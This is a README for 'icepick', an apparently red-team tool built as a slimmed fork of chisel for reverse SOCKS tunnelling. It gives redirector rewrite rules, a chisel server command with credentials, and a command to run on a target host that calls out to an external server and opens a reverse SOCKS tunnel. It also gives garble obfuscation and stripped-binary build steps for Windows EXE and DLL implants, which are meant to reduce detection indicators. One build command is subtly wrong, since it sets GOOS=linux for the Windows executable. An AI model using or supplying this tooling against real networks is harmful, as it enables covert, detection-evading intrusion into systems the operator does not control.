# icepick

icepick is a slimmed down version of chisel meant only for reverse socks. It includes most of the client functionality, but has had all logging/errors and other uneeded elements removed. 

Warning: This means it won't print errors, which might be annoying should you want to troubleshoot it client-side.

## Possible Improvements to make
(Feel free to suggest alternative ideas)

* Using utls or utls-light to reduce golang TLS ioc's
* Server-side component (to reduce flags etc)
* Multiple URI support
* IOC reduction
 - User-Agent from gorilla/websockets is "Go-http-client\/1.1", obfuscate for now by using HTTPS.
  

## Usage

First install golang and any necessary depedencies as shown in the next section.

On your proxy add the following:

```
        RewriteCond %{HTTP_USER_AGENT} ""Go-http-client\/1.1"" [NC]
        RewriteCond %{HTTP:CONNECTION} Upgrade$ [NC]
        RewriteCond %{HTTP:UPGRADE} ^WebSocket$ [NC]
        RewriteRule ^ ws://IP_OF_RT20X:LISTENING_PORT [NC,L,P]
```
Then run chisel with a command like so:

```sh
./chisel server -v -p 443 --auth "test:P@ssw0rd!" --reverse --tls-domain validtlsdomain.com
#or
./chisel server -v -p 8080 --auth "test:P@ssw0rd!" --reverse <optional:other tls opts>
```

Now on the target run:

```cmd
.\icepick_win_amd64.exe -auth "test:P@ssw0rd!" https://veri-serv.com R:socks

```

## Install/Compile to executable
As this is a copy of chisel, you can use the existing server-side chisel binary (unless there are major version changes).

Download and install Go 1.19 from https://golang.org/doc/install

**CROSS COMPILING IS EASY**
Just literally change GOOS=<OSOFCHOICE> to your desired platform.

### linux elf on windows: 
```ps1
choco install mingw -y
go get -v github.com/jpillora/chisel
go install mvdan.cc/garble@latest
GOOS=linux GOARCH=amd64 garble -tiny build -trimpath -ldflags="-s -w" -o icepick_lin_amd64 main.go
```

### windows exe on linux:
```sh
sudo apt install mingw-w64
go get -v github.com/jpillora/chisel
go install mvdan.cc/garble@latest

cd cmd/agent
GOOS=linux GOARCH=amd64 garble -tiny build -trimpath -ldflags="-s -w" -o icepick_win_amd64.exe main.go
```

### windll:

```
garble -tiny build --buildmode=c-shared --ldflags="-s -w" cmd/agentdll/main.go    

```
**NOTE:**
Mingw is I believe only required for some cross compilation when CGO is used.
e.g. if you want to make a dll you need to do the following:
```sh
GOOS=windows GOARCH=amd64 garble -tiny build --buildmode=c-shared -trimpath -ldflags="-s -w" -o icepick_win_amd64.dll main.go
```
